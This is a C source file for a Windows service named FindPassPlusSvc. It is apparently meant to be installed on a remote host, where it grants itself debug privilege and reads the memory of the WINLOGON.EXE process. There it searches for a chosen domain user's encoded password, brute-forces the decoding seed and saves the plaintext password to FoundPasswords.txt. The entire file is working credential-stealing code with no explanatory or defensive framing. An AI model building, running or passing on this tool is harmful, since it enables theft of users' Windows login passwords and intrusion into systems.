//
// gcc -c FindPassPlusSvc.c -o FindPassPlusSvc.exe
//

#include <windows.h>
#include <string.h>
#include <stdio.h>

typedef struct _UNICODE_STRING
{
	USHORT        Length;
	USHORT MaximumLength;
	CHAR *        Buffer;
} UNICODE_STRING;

typedef BOOL  (WINAPI                *EnumProcesses)( DWORD *, DWORD, DWORD * );
typedef BOOL  (WINAPI           *EnumProcessModules)( HANDLE, HMODULE *, DWORD, DWORD * );
typedef DWORD (WINAPI            *GetModuleBaseName)( HANDLE, HMODULE, CHAR *, DWORD );
typedef VOID  (__stdcall *RtlRunDecodeUnicodeString)( BYTE, UNICODE_STRING * );

INT WINAPI            ServiceMain( INT argc, CHAR *argv[] );
VOID WINAPI  MyServiceCtrlHandler( DWORD dwOption );
VOID              WriteToErrorLog( CHAR *szErrorMsg );
BOOL            AddDebugPrivilege( VOID );
BOOL        FindWinlogonProcesses( CHAR *szDomainName, CHAR *szUsername );
BOOL          SearchProcessMemory( DWORD *dwPID, CHAR *szDomainName, CHAR *szUsername );

SERVICE_STATUS        MyServiceStatus;
SERVICE_STATUS_HANDLE MyServiceStatusHandle;

INT main( INT argc, CHAR *argv[] )
{
	SERVICE_TABLE_ENTRY DispatchTable[] = { { "FindPassPlusSvc", (LPSERVICE_MAIN_FUNCTION)ServiceMain }, { NULL, NULL } };

	StartServiceCtrlDispatcher( DispatchTable );

	return 0;
}

INT WINAPI ServiceMain( INT argc, CHAR *argv[] )
{
	CHAR szSearchDomainName[ 128 ];
	CHAR   szSearchUsername[ 128 ];


	strcpy( szSearchDomainName, argv[1] );
	strcpy( szSearchUsername,   argv[2] );

	MyServiceStatus.dwServiceType             = SERVICE_WIN32;
	MyServiceStatus.dwCurrentState            = SERVICE_STOP;
	MyServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
	MyServiceStatus.dwWin32ExitCode           = 0;
	MyServiceStatus.dwServiceSpecificExitCode = 0;
	MyServiceStatus.dwCheckPoint              = 0;
	MyServiceStatus.dwWaitHint                = 0;

	MyServiceStatusHandle = RegisterServiceCtrlHandler( "FindPassPlusSvc", MyServiceCtrlHandler );

	if ( MyServiceStatusHandle != 0 )
	{
		MyServiceStatus.dwCurrentState = SERVICE_START_PENDING;

		if ( SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus ) )
		{
			MyServiceStatus.dwCurrentState = SERVICE_RUNNING;
 
			if ( SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus ) )
			{
				if ( AddDebugPrivilege() )
				{
					if ( !FindWinlogonProcesses( szSearchDomainName, szSearchUsername ) )
					{
						WriteToErrorLog( "ERROR! Cannot find WINLOGON.EXE process on remote host.\n" );
					}
				}
				else
				{
					WriteToErrorLog( "ERROR! Cannot add debug privilege to process on remote host.\n" );
				}
			}
		}
	}

	MyServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;

	if ( SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus ) )
	{
		MyServiceStatus.dwCurrentState = SERVICE_ACCEPT_STOP;

		SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus );
	}

	return 0;
}

VOID WINAPI MyServiceCtrlHandler( DWORD dwOption )
{ 
	switch ( dwOption )
	{
		case SERVICE_CONTROL_PAUSE:
			MyServiceStatus.dwCurrentState = SERVICE_PAUSED;

			SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus );

			break;

		case SERVICE_CONTROL_CONTINUE:
			MyServiceStatus.dwCurrentState = SERVICE_RUNNING;

			SetServiceStatus( MyServiceStatusHandle, &MyServiceStatus );

			break;
 
		case SERVICE_CONTROL_STOP:
			break;

		case SERVICE_CONTROL_INTERROGATE:
			break;

		default:
			break;
	}
}

VOID WriteToErrorLog( CHAR szErrorMsg[] )
{
	FILE *pOutputFile;

	pOutputFile = fopen( "ErrorLog.txt", "r" );

	if ( pOutputFile != NULL )
	{
		fclose( pOutputFile );
	}
	else
	{
		pOutputFile = fopen( "ErrorLog.txt", "w" );

		if ( pOutputFile != NULL )
		{
			fclose( pOutputFile );
		}
	}

	pOutputFile = fopen( "ErrorLog.txt", "a+" );

	if ( pOutputFile != NULL )
	{
		fprintf( pOutputFile, "%s", szErrorMsg );

		fclose( pOutputFile );
	}
}

BOOL AddDebugPrivilege( VOID )
{
	BOOL              bReturn;
	HANDLE             hToken;
	LUID             luidInfo;
	TOKEN_PRIVILEGES   tpInfo;
	DWORD             dwError;

	bReturn = FALSE;

	if ( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken ) )
	{
		if ( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &luidInfo ) )
		{
			tpInfo.PrivilegeCount           = 1;
			tpInfo.Privileges[0].Luid       = luidInfo;
			tpInfo.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if ( AdjustTokenPrivileges( hToken, FALSE, &tpInfo, sizeof( TOKEN_PRIVILEGES ), NULL, NULL ) )
			{
				dwError = GetLastError();

				if ( dwError == ERROR_SUCCESS )
				{
					bReturn = TRUE;
				}
			}
		}

		CloseHandle( hToken );
	}

	return bReturn;
}

BOOL FindWinlogonProcesses( CHAR szDomainName[], CHAR szUsername[] )
{
	BOOL                           bReturn;
	HANDLE                          hPSAPI;
	EnumProcesses           pEnumProcesses;
	EnumProcessModules pEnumProcessModules;
	GetModuleBaseName   pGetModuleBaseName;
	DWORD                     dwProcessIDs[ 2048 ];
	DWORD                         dwNeeded;
	DWORD                      dwProcesses;
	unsigned int                         i;
	HANDLE                        hProcess;
	HMODULE                        hModule;
	CHAR                     szProcessName[ 256 ];
	DWORD                            dwPID;
	CHAR                        szErrorMsg[ 128 ];

	bReturn = FALSE;

	hPSAPI = LoadLibrary( "psapi.dll" );

	pEnumProcesses      =      (EnumProcesses)GetProcAddress( hPSAPI, "EnumProcesses" );
	pEnumProcessModules = (EnumProcessModules)GetProcAddress( hPSAPI, "EnumProcessModules" );
	pGetModuleBaseName  =  (GetModuleBaseName)GetProcAddress( hPSAPI, "GetModuleBaseNameA" );

	if ( pEnumProcesses && pEnumProcessModules && pGetModuleBaseName )
	{
		if ( pEnumProcesses( dwProcessIDs, sizeof( dwProcessIDs ), &dwNeeded ) )
		{
			dwProcesses = dwNeeded / sizeof( DWORD );

			for ( i = 0; i < dwProcesses; i++ )
			{
				if ( dwProcessIDs[i] != 0 )
				{
					hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessIDs[i] );

					if ( hProcess != NULL )
					{
						if ( pEnumProcessModules( hProcess, &hModule, sizeof( hModule ), &dwNeeded ) )
						{
							pGetModuleBaseName( hProcess, hModule, szProcessName, sizeof( szProcessName ) / sizeof( CHAR ) );

							strupr( szProcessName );

							if ( strcmp( szProcessName, "WINLOGON.EXE" ) == 0 )
							{
								bReturn = TRUE;

								dwPID = dwProcessIDs[i];

								if ( !SearchProcessMemory( &dwPID, szDomainName, szUsername ) )
								{
									sprintf( szErrorMsg, "ERROR! Could not find password for user %s\\%s in WINLOGON.EXE process ID %d.\n", szDomainName, szUsername, dwPID );

									WriteToErrorLog( szErrorMsg );
								}
							}
						}

						CloseHandle( hProcess );
					}
				}
			}
		}

		FreeLibrary( hPSAPI );
	}
	else
	{
		WriteToErrorLog( "ERROR! Cannot load Psapi.dll functions on remote host.\n" );
	}

	return bReturn;
}

BOOL SearchProcessMemory( DWORD *dwPID, CHAR szDomainName[], CHAR szUsername[] )
{
	BOOL                                         bReturn;
	HINSTANCE                                     hNTDLL;
	RtlRunDecodeUnicodeString pRtlRunDecodeUnicodeString;
	WCHAR                                  wszDomainName[ 256 ];
	WCHAR                                    wszUsername[ 256 ];
	HANDLE                                      hProcess;
	DWORD                                              i;
	SYSTEM_INFO                                   siInfo;
	DWORD                                   dwMinAddress;
	DWORD                                   dwMaxAddress;
	DWORD                                     dwPageSize;
	DWORD                               dwCurrentAddress;
	MEMORY_BASIC_INFORMATION                     mbiInfo;
	VOID                                        *pBuffer;
	DWORD                                    dwBytesRead;
	WCHAR                                     *pUsername;
	WCHAR                                   *pDomainName;
	WCHAR                                     *pPassword;
	DWORD                                              j;
	DWORD                                              k;
	DWORD                               dwPasswordLength;
	UNICODE_STRING                        usPasswordInfo;
	BYTE                                              *p;
	BOOL                               bPasswordViewable;
	FILE                                    *pOutputFile;

	bReturn = FALSE;

	hNTDLL = LoadLibrary( "ntdll.dll" );

	pRtlRunDecodeUnicodeString = (RtlRunDecodeUnicodeString)GetProcAddress( hNTDLL, "RtlRunDecodeUnicodeString" );

	if ( pRtlRunDecodeUnicodeString )
	{
		MultiByteToWideChar( CP_ACP, 0, szDomainName, strlen( szDomainName ) + 1, wszDomainName, sizeof( wszDomainName ) / sizeof( wszDomainName[0] ) );
		MultiByteToWideChar( CP_ACP, 0, szUsername,   strlen( szUsername ) + 1,   wszUsername,   sizeof( wszUsername ) / sizeof( wszUsername[0] ) );

		hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, *dwPID );

		if ( hProcess != NULL )
		{
			i = 0;

			GetSystemInfo( &siInfo );

			dwMinAddress = (DWORD)siInfo.lpMinimumApplicationAddress;
			dwMaxAddress = (DWORD)siInfo.lpMaximumApplicationAddress;
			dwPageSize   = siInfo.dwPageSize;

			dwCurrentAddress = dwMinAddress;

			while ( dwCurrentAddress < dwMaxAddress )
			{
				if ( VirtualQueryEx( hProcess, (VOID *)dwCurrentAddress, &mbiInfo, sizeof( MEMORY_BASIC_INFORMATION ) ) )
				{
					pBuffer = NULL;

					pBuffer = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, mbiInfo.RegionSize );

					if ( pBuffer != NULL )
					{
						dwBytesRead = 0;

						if ( ReadProcessMemory( hProcess, (VOID *)dwCurrentAddress, pBuffer, mbiInfo.RegionSize, &dwBytesRead ) )
						{
							pUsername   = (WCHAR *)pBuffer;
							pDomainName = (WCHAR *)( (DWORD)pBuffer + 0x400 );
							pPassword   = (WCHAR *)( (DWORD)pBuffer + 0x800 );

							if ( _wcsicmp( pUsername, wszUsername ) == 0 && _wcsicmp( pDomainName, wszDomainName ) == 0 )
							{
								j = 0;
								k = 0;

								while ( j < 256 )
								{
									if ( k == 2 )
									{
										break;
									}

									if ( pPassword[j] == 0x00 )
									{
										k++;
									}
									else
									{
										k = 0;
									}

									j++;
								}

								dwPasswordLength = j - sizeof( WCHAR );

								usPasswordInfo.Length        = dwPasswordLength * sizeof( WCHAR );
								usPasswordInfo.MaximumLength = ( dwPasswordLength + 1 ) * sizeof( WCHAR );
								usPasswordInfo.Buffer        = NULL;

								usPasswordInfo.Buffer = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, usPasswordInfo.MaximumLength );

								if ( usPasswordInfo.Buffer != NULL )
								{
									for ( j = 0; j < 256; j++ )
									{
										CopyMemory( usPasswordInfo.Buffer, pPassword, usPasswordInfo.MaximumLength );

										pRtlRunDecodeUnicodeString( (BYTE)j, &usPasswordInfo );

										p = (BYTE *)usPasswordInfo.Buffer;

										bPasswordViewable = TRUE;

										for ( k = 0; k < usPasswordInfo.Length; k++ )
										{
											if ( k % 2 == 0 )
											{
												if ( *p > 0x7E && *p < 0x20 )
												{
													bPasswordViewable = FALSE;
												}
											}
											else
											{
												if ( *p != 0x00 )
												{
													bPasswordViewable = FALSE;
												}
											}
											
											p++;
										}

										if ( bPasswordViewable )
										{
											bReturn = TRUE;

											pOutputFile = fopen( "FoundPasswords.txt", "r" );

											if ( pOutputFile != NULL )
											{
												fclose( pOutputFile );
											}
											else
											{
												pOutputFile = fopen( "FoundPasswords.txt", "w" );

												if ( pOutputFile != NULL )
												{
													fclose( pOutputFile );
												}
											}

											pOutputFile = fopen( "FoundPasswords.txt", "a+" );

											if ( pOutputFile != NULL )
											{
												fprintf( pOutputFile, "Password found for user %s\\%s in WINLOGON.EXE process ID %d: %S\n", szDomainName, szUsername, *dwPID, usPasswordInfo.Buffer );

												fclose( pOutputFile );
											}
										}
									}

									HeapFree( GetProcessHeap(), 0, usPasswordInfo.Buffer );
								}
							}
						}

						HeapFree( GetProcessHeap(), 0, pBuffer );
					}

					dwCurrentAddress = dwCurrentAddress + mbiInfo.RegionSize;
				}
				else
				{
					dwCurrentAddress = dwCurrentAddress + dwPageSize;
				}
			}

			CloseHandle( hProcess );
		}

		FreeLibrary( hNTDLL );
	}
	else
	{
		WriteToErrorLog( "ERROR! Cannot load RtlRunDecodeUnicodeString function on remote host.\n" );
	}

	return bReturn;
}

// Written by Reed Arvin | reedarvin@gmail.com
